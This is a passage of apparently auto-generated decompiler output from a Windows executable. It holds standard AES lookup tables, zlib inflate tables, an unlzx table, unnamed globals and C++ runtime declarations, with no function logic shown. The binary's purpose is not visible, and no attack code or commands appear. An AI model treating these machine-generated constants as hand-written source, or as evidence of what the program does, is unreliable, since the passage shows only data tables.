-0x171910eb, -0x64264519, 0x36ce4a6f, 0x9d4ea9f, 0x7cd629b0, -0x4d50ce5c, 0x23312a3f, -0x6bcf395b, 0x66c035a2, -0x43c88bb2, -0x3559037e, -0x2f4f1f70, -0x27eacc59, -0x67b50efc, -0x2508be14, 0x500e7fcd, -0x9d0e86f, -0x297289b3, -0x4fb2bc11, 0x4d54ccaa, 0x4dfe496, -0x4a1c612f, -0x77e4b396, 0x1fb8c12c, 0x517f4665, -0x15fb62a2, 0x355d018c, 0x7473fa87, 0x412efb0b, 0x1d5ab367, -0x2dad6d25, 0x5633e910, 0x47136dd6, 0x618c9ad7, 0xc7a37a1, 0x148e59f8, 0x3c89eb13, 0x27eecea9, -0x36ca489f, -0x1a121ee4, -0x4ec385b9, -0x20a6632e, 0x733f55f2, -0x3186e7ec, 0x37bf73c7, -0x3215ac09, -0x55a4a003, 0x6f14df3d, -0x247987bc, -0xc7e3551, -0x3bc14698, 0x342c3824, 0x405fc2a3, -0x3c8de9e3, 0x250cbce2, 0x498b283c, -0x6abe00f3, 0x17139a8, -0x4c21f7f4, -0x1b63274c, -0x3e6f9baa, -0x7b9e8435, -0x498f2ace, 0x5c74486c, 0x5742d0b8}; // 0x40a3fc
// Detected cryptographic pattern: Rijndael_Td3__0xf4a75051U_ (32-bit, little endian)
int32_t Rijndael_Td3__0xf4a75051U__at_40a7fc[256] = {-0xb58afaf, 0x4165537e, 0x17a4c31a, 0x275e963a, -0x549434c5, -0x62ba0ee1, -0x5a75454, -0x1cfc6cb5, 0x30fa5520, 0x766df6ad, -0x33896e78, 0x24c25f5, -0x1a2803b1, 0x2acbd7c5, 0x35448026, 0x62a38fb5, -0x4ea5b622, -0x45e498db, -0x15f167bb, -0x13f1ea3, 0x2f7502c3, 0x4cf01281, 0x4697a38d, -0x2c063995, -0x70a018fd, -0x6d636aeb, 0x6d7aebbf, 0x5259da95, -0x417cd22c, 0x7421d358, -0x1f96d6b7, -0x3637bb72, -0x3d76958b, -0x7186870c, 0x583e6b99, -0x468e22d9, -0x1eb04942, -0x7752e810, 0x20ac66c9, -0x31c54b83, -0x20b5e79d, 0x1a3182e5, 0x51336097, 0x537f4562, 0x6477e0b1, 0x6bae84bb, -0x7e5fe302, 0x82b94f9, 0x48685870, 0x45fd198f, -0x2193786c, 0x7bf8b752, 0x73d323ab, 0x4b02e272, 0x1f8f57e3, 0x55ab2a66, -0x14d7f84e, -0x4a3dfcd1, -0x3a84657a, 0x3708a5d3, 0x2887f230, -0x405a4ddd, 0x36aba02, 0x16825ced, -0x30e3d476, 0x79b492a7, 0x7f2f0f3, 0x69e2a14e, -0x250b329b, 0x5bed506, 0x34621fd1, -0x5901753c, 0x2e539d34, -0xcaa5f5e, -0x751ecdfb, -0x9148a5c, -0x7c13c6f5, 0x60efaa40, 0x719f065e, 0x6e1051bd, 0x218af93e, -0x22f9c26a, 0x3e05aedd, -0x1942b9b3, 0x548db591, -0x3ba2fa8f, 0x6d46f04, 0x5015ff60, -0x6704dbe7, -0x4216682a, 0x4043cc89, -0x26618899, -0x17bd4250, -0x767477f9, 0x195b38e7, -0x37112487, 0x7c0a47a1, 0x420fe97c, -0x7be13608, 0, -0x7f797cf7, 0x2bed4832, 0x1170ac1e, 0x5a724e6c, 0xefffbfd, -0x7ac7a9f1, -0x512ae1c3, 0x2d392736, 0xfd9640a, 0x5ca62168, 0x5b54d19b, 0x362e3a24, 0xa67b10c, 0x57e70f93, -0x11692d4c, -0x646e61e5, -0x3f3ab080, -0x23df5d9f, 0x774b695a, 0x121a161c, -0x6c45f51e, -0x5fd51a40, 0x22e0433c, 0x1b171d12, 0x90d0b0e, -0x7438520e, -0x495746d3, 0x1ea9c814, -0xee67aa9, 0x75074caf, -0x66224412, 0x7f60fda3, 0x1269ff7, 0x72f5bc5c, 0x663bc544, -0x481cba5, 0x4329768b, 0x23c6dccb, -0x1203974a, -0x1b0e9c48, 0x31dccad7, 0x63851042, -0x68ddbfed, -0x39eedf7c, 0x4a247d85, -0x44c2072e, -0x6cdee52, 0x29a16dc7, -0x61d0b4e3, -0x4dcf0c24, -0x79ad13f3, -0x3e1c2f89, -0x4ce993d5, 0x70b999a9, -0x6bb705ef, -0x169bddb9, -0x3733b58, -0xfc0e560, 0x7d2cd856, 0x3390ef22, 0x494ec787, 0x38d1c1d9, -0x355d0174, -0x2bf4c968, -0xa7e305a, 0x7ade28a5, -0x4871d926, -0x52405bc1, 0x3a9de42c, 0x78920d50, 0x5fcc9b6a, 0x7e466254, -0x72ec3d0a, -0x27471770, 0x39f75e2e, -0x3c500a7e, 0x5d80be9f, -0x2f6c8397, -0x2ad25691, 0x2512b3cf, -0x5366c438, 0x187da710, -0x639c9118, 0x3bbb7bdb, 0x267809cd, 0x5918f46e, -0x6548fe14, 0x4f9aa883, -0x6a919a1a, -0x198156, -0x4330f7df, 0x15e8e6ef, -0x18642646, 0x6f36ce4a, -0x60f62b16, -0x4f8329d7, -0x5b4d50cf, 0x3f23312a, -0x5a6bcf3a, -0x5d993fcb, 0x4ebc3774, -0x7d355904, -0x6f2f4f20, -0x5827eacd, 0x4984af1, -0x132508bf, -0x32aff181, -0x6e09d0e9, 0x4dd68d76, -0x104fb2bd, -0x55b2ab34, -0x69fb201c, -0x2e4a1c62, 0x6a881b4c, 0x2c1fb8c1, 0x65517f46, 0x5eea049d, -0x73caa2ff, -0x788b8c06, 0xb412efb, 0x671d5ab3, -0x242dad6e, 0x105633e9, -0x29b8ec93, -0x289e7366, -0x5ef385c9, -0x7eb71a7, 0x133c89eb, -0x56d81132, 0x61c935b7, 0x1ce5ede1, 0x47b13c7a, -0x2d20a664, -0xd8cc0ab, 0x14ce7918, -0x38c8408d, -0x83215ad, -0x255a4a1, 0x3d6f14df, 0x44db8678, -0x500c7e36, 0x68c43eb9, 0x24342c38, -0x5cbfa03e, 0x1dc37216, -0x1ddaf344, 0x3c498b28, 0xd9541ff, -0x57fe8ec7, 0xcb3de08, -0x4b1b6328, 0x56c19064, -0x347b9e85, 0x32b670d5, 0x6c5c7448, -0x47a8bd30}; // 0x40a7fc
// Detected cryptographic pattern: Rijndael_Te0__0xc66363a5U_ (32-bit, little endian)
int32_t Rijndael_Te0__0xc66363a5U__at_408bfc[256] = {-0x399c9c5b, -0x783837c, -0x11888867, -0x9848473, -0xd0df3, -0x29949443, -0x2190904f, -0x6e3a3aac, 0x60303050, 0x2010103, -0x31989857, 0x562b2b7d, -0x180101e7, -0x4a28289e, 0x4dababe6, -0x13898966, -0x703535bb, 0x1f82829d, -0x763636c0, -0x5828279, -0x100505eb, -0x4da6a615, -0x71b8b837, -0x40f0ff5, 0x41adadec, -0x4c2b2b99, 0x5fa2a2fd, 0x45afafea, 0x239c9cbf, 0x53a4a4f7, -0x1b8d8d6a, -0x643f3fa5, 0x75b7b7c2, -0x1e0202e4, 0x3d9393ae, 0x4c26266a, 0x6c36365a, 0x7e3f3f41, -0xa0808fe, -0x7c3333b1, 0x6834345c, 0x51a5a5f4, -0x2e1a1acc, -0x60e0ef8, -0x1d8e8e6d, -0x5427278d, 0x62313153, 0x2a15153f, 0x804040c, -0x6a3838ae, 0x46232365, -0x623c3ca2, 0x30181828, 0x379696a1, 0xa05050f, 0x2f9a9ab5, 0xe070709, 0x24121236, 0x1b80809b, -0x201d1dc3, -0x321414da, 0x4e272769, 0x7fb2b2cd, -0x158a8a61, 0x1209091b, 0x1d83839e, 0x582c2c74, 0x341a1a2e, 0x361b1b2d, -0x2391914e, -0x4ba5a512, 0x5ba0a0fb, -0x5badad0a, 0x763b3b4d, -0x4829299f, 0x7db3b3ce, 0x5229297b, -0x221c1cc2, 0x5e2f2f71, 0x13848497, -0x59acac0b, -0x462e2e98, 0, -0x3e1212d4, 0x40202060, -0x1c0303e1, 0x79b1b1c8, -0x49a4a413, -0x2b959542, -0x723434ba, 0x67bebed9, 0x7239394b, -0x6bb5b522, -0x67b3b32c, -0x4fa7a718, -0x7a3030b6, -0x442f2f95, -0x3a1010d6, 0x4faaaae5, -0x120404ea, -0x79bcbc3b, -0x65b2b229, 0x66333355, 0x11858594, -0x75baba31, -0x160606f0, 0x4020206, -0x180807f, -0x5fafaf10, 0x783c3c44, 0x259f9fba, 0x4ba8a8e3, -0x5daeae0d, 0x5da3a3fe, -0x7fbfbf40, 0x58f8f8a, 0x3f9292ad, 0x219d9dbc, 0x70383848, -0xe0a0afc, 0x63bcbcdf, 0x77b6b6c1, -0x5025258b, 0x42212163, 0x20101030, -0x1a0000e6, -0x20c0cf2, -0x402d2d93, -0x7e3232b4, 0x180c0c14, 0x26131335, -0x3c1313d1, -0x41a0a01f, 0x359797a2, -0x77bbbb34, 0x2e171739, -0x6c3b3ba9, 0x55a7a7f2, -0x381817e, 0x7a3d3d47, -0x379b9b54, -0x45a2a219, 0x3219192b, -0x198c8c6b, -0x3f9f9f60, 0x19818198, -0x61b0b02f, -0x5c232381, 0x44222266, 0x542a2a7e, 0x3b9090ab, 0xb888883, -0x73b9b936, -0x381111d7, 0x6bb8b8d3, 0x2814143c, -0x58212187, -0x43a1a11e, 0x160b0b1d, -0x5224248a, -0x241f1fc5, 0x64323256, 0x743a3a4e, 0x140a0a1e, -0x6db6b625, 0xc06060a, 0x4824246c, -0x47a3a31c, -0x603d3da3, -0x422c2c92, 0x43acacef, -0x3b9d9d5a, 0x399191a8, 0x319595a4, -0x2c1b1bc9, -0xd868675, -0x2a1818ce, -0x743737bd, 0x6e373759, -0x25929249, 0x18d8d8c, -0x4e2a2a9c, -0x63b1b12e, 0x49a9a9e0, -0x2793934c, -0x53a9a906, -0xc0b0bf9, -0x301515db, -0x359a9a51, -0xb858572, 0x47aeaee9, 0x10080818, 0x6fbabad5, -0xf878778, 0x4a25256f, 0x5c2e2e72, 0x381c1c24, 0x57a6a6f1, 0x73b4b4c7, -0x683939af, -0x341717dd, -0x5e222284, -0x178b8b64, 0x3e1f1f21, -0x69b4b423, 0x61bdbddc, 0xd8b8b86, 0xf8a8a85, -0x1f8f8f70, 0x7c3e3e42, 0x71b5b5c4, -0x33999956, -0x6fb7b728, 0x6030305, -0x80909ff, 0x1c0e0e12, -0x3d9e9e5d, 0x6a35355f, -0x51a8a807, 0x69b9b9d0, 0x17868691, -0x663e3ea8, 0x3a1d1d27, 0x279e9eb9, -0x261e1ec8, -0x140707ed, 0x2b9898b3, 0x22111133, -0x2d969645, -0x56262690, 0x78e8e89, 0x339494a7, 0x2d9b9bb6, 0x3c1e1e22, 0x15878792, -0x361616e0, -0x783131b7, -0x55aaaa01, 0x50282878, -0x5a202086, 0x38c8c8f, 0x59a1a1f8, 0x9898980, 0x1a0d0d17, 0x65bfbfda, -0x281919cf, -0x7bbdbd3a, -0x2f979748, -0x7dbebe3d, 0x299999b0, 0x5a2d2d77, 0x1e0f0f11, 0x7bb0b0cb, -0x57abab04, 0x6dbbbbd6, 0x2c16163a}; // 0x408bfc
// Detected cryptographic pattern: Rijndael_Te1__0xa5c66363U_ (32-bit, little endian)
int32_t Rijndael_Te1__0xa5c66363U__at_408ffc[256] = {-0x5a399c9d, -0x7b078384, -0x66118889, -0x72098485, 0xdfff2f2, -0x42299495, -0x4e219091, 0x5491c5c5, 0x50603030, 0x3020101, -0x56319899, 0x7d562b2b, 0x19e7fefe, 0x62b5d7d7, -0x19b25455, -0x6513898a, 0x458fcaca, -0x62e07d7e, 0x4089c9c9, -0x78058283, 0x15effafa, -0x144da6a7, -0x3671b8b9, 0xbfbf0f0, -0x13be5253, 0x67b3d4d4, -0x2a05d5e, -0x15ba5051, -0x40dc6364, -0x8ac5b5c, -0x691b8d8e, 0x5b9bc0c0, -0x3d8a4849, 0x1ce1fdfd, -0x51c26c6d, 0x6a4c2626, 0x5a6c3636, 0x417e3f3f, 0x2f5f7f7, 0x4f83cccc, 0x5c683434, -0xbae5a5b, 0x34d1e5e5, 0x8f9f1f1, -0x6c1d8e8f, 0x73abd8d8, 0x53623131, 0x3f2a1515, 0xc080404, 0x5295c7c7, 0x65462323, 0x5e9dc3c3, 0x28301818, -0x5ec8696a, 0xf0a0505, -0x4ad06566, 0x90e0707, 0x36241212, -0x64e47f80, 0x3ddfe2e2, 0x26cdebeb, 0x694e2727, -0x32804d4e, -0x60158a8b, 0x1b120909, -0x61e27c7d, 0x74582c2c, 0x2e341a1a, 0x2d361b1b, -0x4d239192, -0x114ba5a6, -0x4a45f60, -0x95badae, 0x4d763b3b, 0x61b7d6d6, -0x31824c4d, 0x7b522929, 0x3edde3e3, 0x715e2f2f, -0x68ec7b7c, -0xa59acad, 0x68b9d1d1, 0, 0x2cc1eded, 0x60402020, 0x1fe3fcfc, -0x37864e4f, -0x1249a4a5, -0x412b9596, 0x468dcbcb, -0x26984142, 0x4b723939, -0x216bb5b6, -0x2b67b3b4, -0x174fa7a8, 0x4a85cfcf, 0x6bbbd0d0, 0x2ac5efef, -0x1ab05556, 0x16edfbfb, -0x3a79bcbd, -0x2865b2b3, 0x55663333, -0x6bee7a7b, -0x3075babb, 0x10e9f9f9, 0x6040202, -0x7e018081, -0xf5fafb0, 0x44783c3c, -0x45da6061, -0x1cb45758, -0xc5daeaf, -0x1a25c5d, -0x3f7fbfc0, -0x75fa7071, -0x52c06d6e, -0x43de6263, 0x48703838, 0x4f1f5f5, -0x209c4344, -0x3e88494a, 0x75afdada, 0x63422121, 0x30201010, 0x1ae5ffff, 0xefdf3f3, 0x6dbfd2d2, 0x4c81cdcd, 0x14180c0c, 0x35261313, 0x2fc3ecec, -0x1e41a0a1, -0x5dca6869, -0x3377bbbc, 0x392e1717, 0x5793c4c4, -0xdaa5859, -0x7d038182, 0x477a3d3d, -0x53379b9c, -0x1845a2a3, 0x2b321919, -0x6a198c8d, -0x5f3f9fa0, -0x67e67e7f, -0x2e61b0b1, 0x7fa3dcdc, 0x66442222, 0x7e542a2a, -0x54c46f70, -0x7cf47778, -0x3573b9ba, 0x29c7eeee, -0x2c944748, 0x3c281414, 0x79a7dede, -0x1d43a1a2, 0x1d160b0b, 0x76addbdb, 0x3bdbe0e0, 0x56643232, 0x4e743a3a, 0x1e140a0a, -0x246db6b7, 0xa0c0606, 0x6c482424, -0x1b47a3a4, 0x5d9fc2c2, 0x6ebdd3d3, -0x10bc5354, -0x593b9d9e, -0x57c66e6f, -0x5bce6a6b, 0x37d3e4e4, -0x740d8687, 0x32d5e7e7, 0x438bc8c8, 0x596e3737, -0x48259293, -0x73fe7273, 0x64b1d5d5, -0x2d63b1b2, -0x1fb65657, -0x4b279394, -0x553a9aa, 0x7f3f4f4, 0x25cfeaea, -0x50359a9b, -0x710b8586, -0x16b85152, 0x18100808, -0x2a904546, -0x770f8788, 0x6f4a2525, 0x725c2e2e, 0x24381c1c, -0xea8595a, -0x388c4b4c, 0x5197c6c6, 0x23cbe8e8, 0x7ca1dddd, -0x63178b8c, 0x213e1f1f, -0x2269b4b5, -0x239e4243, -0x79f27475, -0x7af07576, -0x6f1f8f90, 0x427c3e3e, -0x3b8e4a4b, -0x5533999a, -0x276fb7b8, 0x5060303, 0x1f7f6f6, 0x121c0e0e, -0x5c3d9e9f, 0x5f6a3535, -0x651a8a9, -0x2f964647, -0x6ee8797a, 0x5899c1c1, 0x273a1d1d, -0x46d86162, 0x38d9e1e1, 0x13ebf8f8, -0x4cd46768, 0x33221111, -0x442d9697, 0x70a9d9d9, -0x76f87172, -0x58cc6b6c, -0x49d26465, 0x223c1e1e, -0x6dea7879, 0x20c9e9e9, 0x4987cece, -0x55aaab, 0x78502828, 0x7aa5dfdf, -0x70fc7374, -0x7a65e5f, -0x7ff67677, 0x171a0d0d, -0x259a4041, 0x31d7e6e6, -0x397bbdbe, -0x472f9798, -0x3c7dbebf, -0x4fd66667, 0x775a2d2d, 0x111e0f0f, -0x34844f50, -0x357abac, -0x29924445, 0x3a2c1616}; // 0x408ffc
// Detected cryptographic pattern: Rijndael_Te2__0x63a5c663U_ (32-bit, little endian)
int32_t Rijndael_Te2__0x63a5c663U__at_4093fc[256] = {0x63a5c663, 0x7c84f87c, 0x7799ee77, 0x7b8df67b, -0xdf2000e, 0x6bbdd66b, 0x6fb1de6f, -0x3aab6e3b, 0x30506030, 0x1030201, 0x67a9ce67, 0x2b7d562b, -0x1e61802, -0x289d4a29, -0x5419b255, 0x769aec76, -0x35ba7036, -0x7d62e07e, -0x36bf7637, 0x7d87fa7d, -0x5ea1006, 0x59ebb259, 0x47c98e47, -0xff40410, -0x5213be53, -0x2b984c2c, -0x5d02a05e, -0x5015ba51, -0x6340dc64, -0x5b08ac5c, 0x7296e472, -0x3fa46440, -0x483d8a49, -0x2e31e03, -0x6c51c26d, 0x266a4c26, 0x365a6c36, 0x3f417e3f, -0x8fd0a09, -0x33b07c34, 0x345c6834, -0x5a0bae5b, -0x1acb2e1b, -0xef7060f, 0x7193e271, -0x278c5428, 0x31536231, 0x153f2a15, 0x40c0804, -0x38ad6a39, 0x23654623, -0x3ca1623d, 0x18283018, -0x695ec86a, 0x50f0a05, -0x654ad066, 0x7090e07, 0x12362412, -0x7f64e480, -0x1dc2201e, -0x14d93215, 0x27694e27, -0x4d32804e, 0x759fea75, 0x91b1209, -0x7c61e27d, 0x2c74582c, 0x1a2e341a, 0x1b2d361b, 0x6eb2dc6e, 0x5aeeb45a, -0x5f04a460, 0x52f6a452, 0x3b4d763b, -0x299e482a, -0x4c31824d, 0x297b5229, -0x1cc1221d, 0x2f715e2f, -0x7b68ec7c, 0x53f5a653, -0x2e97462f, 0, -0x12d33e13, 0x20604020, -0x3e01c04, -0x4e37864f, 0x5bedb65b, 0x6abed46a, -0x34b97235, -0x41269842, 0x394b7239, 0x4ade944a, 0x4cd4984c, 0x58e8b058, -0x30b57a31, -0x2f944430, -0x10d53a11, -0x551ab056, -0x4e91205, 0x43c58643, 0x4dd79a4d, 0x33556633, -0x7a6bee7b, 0x45cf8a45, -0x6ef1607, 0x2060402, 0x7f81fe7f, 0x50f0a050, 0x3c44783c, -0x6045da61, -0x571cb458, 0x51f3a251, -0x5c01a25d, 0x40c08040, -0x7075fa71, -0x6d52c06e, -0x6243de63, 0x38487038, -0xafb0e0b, -0x43209c44, -0x493e884a, -0x258a5026, 0x21634221, 0x10302010, -0xe51a01, -0xcf1020d, -0x2d92402e, -0x32b37e33, 0xc14180c, 0x13352613, -0x13d03c14, 0x5fe1be5f, -0x685dca69, 0x44cc8844, 0x17392e17, -0x3ba86c3c, -0x580daa59, 0x7e82fc7e, 0x3d477a3d, 0x64acc864, 0x5de7ba5d, 0x192b3219, 0x7395e673, 0x60a0c060, -0x7e67e67f, 0x4fd19e4f, -0x23805c24, 0x22664422, 0x2a7e542a, -0x6f54c470, -0x777cf478, 0x46ca8c46, -0x11d63812, -0x472c9448, 0x143c2814, -0x21865822, 0x5ee2bc5e, 0xb1d160b, -0x24895225, -0x1fc42420, 0x32566432, 0x3a4e743a, 0xa1e140a, 0x49db9249, 0x60a0c06, 0x246c4824, 0x5ce4b85c, -0x3da2603e, -0x2c91422d, -0x5310bc54, 0x62a6c462, -0x6e57c66f, -0x6a5bce6b, -0x1bc82c1c, 0x798bf279, -0x18cd2a19, -0x37bc7438, 0x37596e37, 0x6db7da6d, -0x7273fe73, -0x2a9b4e2b, 0x4ed29c4e, -0x561fb657, 0x6cb4d86c, 0x56faac56, -0xbf80c0c, -0x15da3016, 0x65afca65, 0x7a8ef47a, -0x5116b852, 0x8181008, -0x452a9046, 0x7888f078, 0x256f4a25, 0x2e725c2e, 0x1c24381c, -0x590ea85a, -0x4b388c4c, -0x39ae683a, -0x17dc3418, -0x22835e23, 0x749ce874, 0x1f213e1f, 0x4bdd964b, -0x42239e43, -0x7479f275, -0x757af076, 0x7090e070, 0x3e427c3e, -0x4a3b8e4b, 0x66aacc66, 0x48d89048, 0x3050603, -0x9fe080a, 0xe121c0e, 0x61a3c261, 0x355f6a35, 0x57f9ae57, -0x462f9647, -0x796ee87a, -0x3ea7663f, 0x1d273a1d, -0x6146d862, -0x1ec7261f, -0x7ec1408, -0x674cd468, 0x11332211, 0x69bbd269, -0x268f5627, -0x7176f872, -0x6b58cc6c, -0x6449d265, 0x1e223c1e, -0x786dea79, -0x16df3617, -0x31b67832, 0x55ffaa55, 0x28785028, -0x20855a21, -0x7370fc74, -0x5e07a65f, -0x767ff677, 0xd171a0d, -0x40259a41, -0x19ce281a, 0x42c68442, 0x68b8d068, 0x41c38241, -0x664fd667, 0x2d775a2d, 0xf111e0f, -0x4f348450, 0x54fca854, -0x44299245, 0x163a2c16}; // 0x4093fc
// Detected cryptographic pattern: Rijndael_Te3__0x6363a5c6U_ (32-bit, little endian)
int32_t Rijndael_Te3__0x6363a5c6U__at_4097fc[256] = {0x6363a5c6, 0x7c7c84f8, 0x777799ee, 0x7b7b8df6, -0xd0df201, 0x6b6bbdd6, 0x6f6fb1de, -0x3a3aab6f, 0x30305060, 0x1010302, 0x6767a9ce, 0x2b2b7d56, -0x101e619, -0x28289d4b, -0x545419b3, 0x76769aec, -0x3535ba71, -0x7d7d62e1, -0x3636bf77, 0x7d7d87fa, -0x505ea11, 0x5959ebb2, 0x4747c98e, -0xf0ff405, -0x525213bf, -0x2b2b984d, -0x5d5d02a1, -0x505015bb, -0x636340dd, -0x5b5b08ad, 0x727296e4, -0x3f3fa465, -0x48483d8b, -0x202e31f, -0x6c6c51c3, 0x26266a4c, 0x36365a6c, 0x3f3f417e, -0x808fd0b, -0x3333b07d, 0x34345c68, -0x5a5a0baf, -0x1a1acb2f, -0xe0ef707, 0x717193e2, -0x27278c55, 0x31315362, 0x15153f2a, 0x4040c08, -0x3838ad6b, 0x23236546, -0x3c3ca163, 0x18182830, -0x69695ec9, 0x5050f0a, -0x65654ad1, 0x707090e, 0x12123624, -0x7f7f64e5, -0x1d1dc221, -0x1414d933, 0x2727694e, -0x4d4d3281, 0x75759fea, 0x9091b12, -0x7c7c61e3, 0x2c2c7458, 0x1a1a2e34, 0x1b1b2d36, 0x6e6eb2dc, 0x5a5aeeb4, -0x5f5f04a5, 0x5252f6a4, 0x3b3b4d76, -0x29299e49, -0x4c4c3183, 0x29297b52, -0x1c1cc123, 0x2f2f715e, -0x7b7b68ed, 0x5353f5a6, -0x2e2e9747, 0, -0x1212d33f, 0x20206040, -0x303e01d, -0x4e4e3787, 0x5b5bedb6, 0x6a6abed4, -0x3434b973, -0x41412699, 0x39394b72, 0x4a4ade94, 0x4c4cd498, 0x5858e8b0, -0x3030b57b, -0x2f2f9445, -0x1010d53b, -0x55551ab1, -0x404e913, 0x4343c586, 0x4d4dd79a, 0x33335566, -0x7a7a6bef, 0x4545cf8a, -0x606ef17, 0x2020604, 0x7f7f81fe, 0x5050f0a0, 0x3c3c4478, -0x606045db, -0x57571cb5, 0x5151f3a2, -0x5c5c01a3, 0x4040c080, -0x707075fb, -0x6d6d52c1, -0x626243df, 0x38384870, -0xa0afb0f, -0x4343209d, -0x49493e89, -0x25258a51, 0x21216342, 0x10103020, -0xe51b, -0xc0cf103, -0x2d2d9241, -0x3232b37f, 0xc0c1418, 0x13133526, -0x1313d03d, 0x5f5fe1be, -0x68685dcb, 0x4444cc88, 0x1717392e, -0x3b3ba86d, -0x58580dab, 0x7e7e82fc, 0x3d3d477a, 0x6464acc8, 0x5d5de7ba, 0x19192b32, 0x737395e6, 0x6060a0c0, -0x7e7e67e7, 0x4f4fd19e, -0x2323805d, 0x22226644, 0x2a2a7e54, -0x6f6f54c5, -0x77777cf5, 0x4646ca8c, -0x1111d639, -0x47472c95, 0x14143c28, -0x21218659, 0x5e5ee2bc, 0xb0b1d16, -0x24248953, -0x1f1fc425, 0x32325664, 0x3a3a4e74, 0xa0a1e14, 0x4949db92, 0x6060a0c, 0x24246c48, 0x5c5ce4b8, -0x3d3da261, -0x2c2c9143, -0x535310bd, 0x6262a6c4, -0x6e6e57c7, -0x6a6a5bcf, -0x1b1bc82d, 0x79798bf2, -0x1818cd2b, -0x3737bc75, 0x3737596e, 0x6d6db7da, -0x727273ff, -0x2a2a9b4f, 0x4e4ed29c, -0x56561fb7, 0x6c6cb4d8, 0x5656faac, -0xb0bf80d, -0x1515da31, 0x6565afca, 0x7a7a8ef4, -0x515116b9, 0x8081810, -0x45452a91, 0x787888f0, 0x25256f4a, 0x2e2e725c, 0x1c1c2438, -0x59590ea9, -0x4b4b388d, -0x3939ae69, -0x1717dc35, -0x2222835f, 0x74749ce8, 0x1f1f213e, 0x4b4bdd96, -0x4242239f, -0x747479f3, -0x75757af1, 0x707090e0, 0x3e3e427c, -0x4a4a3b8f, 0x6666aacc, 0x4848d890, 0x3030506, -0x909fe09, 0xe0e121c, 0x6161a3c2, 0x35355f6a, 0x5757f9ae, -0x46462f97, -0x79796ee9, -0x3e3ea767, 0x1d1d273a, -0x616146d9, -0x1e1ec727, -0x707ec15, -0x67674cd5, 0x11113322, 0x6969bbd2, -0x26268f57, -0x717176f9, -0x6b6b58cd, -0x646449d3, 0x1e1e223c, -0x78786deb, -0x1616df37, -0x3131b679, 0x5555ffaa, 0x28287850, -0x2020855b, -0x737370fd, -0x5e5e07a7, -0x76767ff7, 0xd0d171a, -0x4040259b, -0x1919ce29, 0x4242c684, 0x6868b8d0, 0x4141c382, -0x66664fd7, 0x2d2d775a, 0xf0f111e, -0x4f4f3485, 0x5454fca8, -0x44442993, 0x16163a2c}; // 0x4097fc
int32_t g1 = 0x40135e; // 0x4081d8
int32_t g2 = 0x4017ff; // 0x4081ec
int32_t g3 = 0; // 0x40abfc
int32_t g4 = 0; // 0x40affc
int32_t g5 = 0; // 0x40b3fc
int32_t g6 = 0; // 0x40b7fc
char * g7 = "\x01\x02\x04\b\x10 @\x80\x1b\x36l\xd8\xabM\x9a/^\xbc\x63\xc6\x97\x35j\xd4\xb3}\xfa\xef\xc5\x91"; // 0x40bbfc
int32_t g8 = 1; // 0x40bc24
int32_t g9 = 3; // 0x40bc28
int32_t g10 = 2; // 0x40bc2c
int32_t g11 = 2; // 0x40bc30
int32_t g12 = 3; // 0x40bc34
int32_t g13 = 1; // 0x40bc38
int32_t g14 = 0x402a53; // 0x40bc7c
int32_t g15 = 1888; // 0x40bcf0
int32_t g16 = 1360; // 0x40ccf0
int32_t g17 = 0; // 0x40d570
void (**g18)() = NULL; // 0x40e000
void (**g19)() = NULL; // 0x40e004
void (**g20)() = NULL; // 0x40e008
void (**g21)() = NULL; // 0x40e00c
char g23[4] = "XIA"; // 0x40f43c
int32_t g24 = 1; // 0x40f53c
char g25[2] = "\\"; // 0x40f818
int32_t g26 = 1; // 0x40f870
int16_t g27 = 0; // 0x40f874
int32_t g28 = 0; // 0x40f878
int32_t g29 = 0; // 0x40f87c
int32_t g30 = 0; // 0x40f880
int32_t g31 = 0; // 0x40f884
int32_t g32 = 0; // 0x40f888
int32_t g33 = 0; // 0x40f88c
int32_t g34 = 0; // 0x40f890
int32_t g35 = 0; // 0x40f894
int32_t g36 = 0; // 0x40f898
int32_t g37 = 0; // 0x40f89c
int32_t g38 = 0; // 0x40f8a0
int32_t g39 = 0; // 0x40f8a4
int32_t g40 = 0; // 0x40f8a8
char * g41; // 0x40f8ac
char g42 = 0; // 0x40f910
int32_t g43 = 0; // 0x40f938
int32_t g44 = 0; // 0x40f93c
int32_t g45 = 0; // 0x40f940
int32_t g46 = 0; // 0x40f944
int32_t g47 = 0; // 0x40f948
int32_t g48 = 0; // 0x40f94c
int32_t g49 = 0; // 0x40f950
int32_t g50 = 0; // 0x40f954
int32_t g51 = 0x29f664e6; // 0x730025
// Detected cryptographic pattern: unlzx_table_three (32-bit, little endian)
int32_t unlzx_table_three_at_40bca8[16] = {0, 1, 3, 7, 15, 31, 63, 127, 255, 511, 1023, 2047, 4095, 0x1fff, 0x3fff, 0x7fff}; // 0x40bca8
int32_t g52;
int32_t g53;
int32_t g54;
// Detected cryptographic pattern: zinflate_distanceExtraBits (32-bit, little endian)
int32_t zinflate_distanceExtraBits_at_40cfdc[30] = {0, 0, 0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 5, 5, 6, 6, 7, 7, 8, 8, 9, 9, 10, 10, 11, 11, 12, 12, 13, 13}; // 0x40cfdc
// Detected cryptographic pattern: zinflate_distanceStarts (32-bit, little endian)
int32_t zinflate_distanceStarts_at_40cf64[30] = {1, 2, 3, 4, 5, 7, 9, 13, 17, 25, 33, 49, 65, 97, 129, 193, 257, 385, 513, 769, 1025, 1537, 2049, 3073, 0x1001, 0x1801, 0x2001, 0x3001, 0x4001, 0x6001}; // 0x40cf64
// Detected cryptographic pattern: zinflate_lengthExtraBits (32-bit, little endian)
int32_t zinflate_lengthExtraBits_at_40cee8[29] = {0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 2, 2, 2, 2, 3, 3, 3, 3, 4, 4, 4, 4, 5, 5, 5, 5, 0}; // 0x40cee8
// Detected cryptographic pattern: zinflate_lengthStarts (32-bit, little endian)
int32_t zinflate_lengthStarts_at_40ce6c[29] = {3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 15, 17, 19, 23, 27, 31, 35, 43, 51, 59, 67, 83, 99, 115, 131, 163, 195, 227, 258}; // 0x40ce6c
int32_t * g22 = &g51; // 0x40eb88

// ------- Dynamically Linked Functions Without Header --------

int32_t _3f__3f_0exception_40__40_QAE_40_ABQBD_40_Z(char ** a1);
int32_t _3f__3f_0exception_40__40_QAE_40_ABV0_40__40_Z(int32_t * a1);
int32_t _3f__3f_1exception_40__40_UAE_40_XZ(void);
int32_t _3f__3f_1type_info_40__40_UAE_40_XZ(void);
int32_t _3f__3f_2_40_YAPAXI_40_Z(int32_t a1);
int32_t _3f__3f_3_40_YAXPAX_40_Z(int32_t * a1);
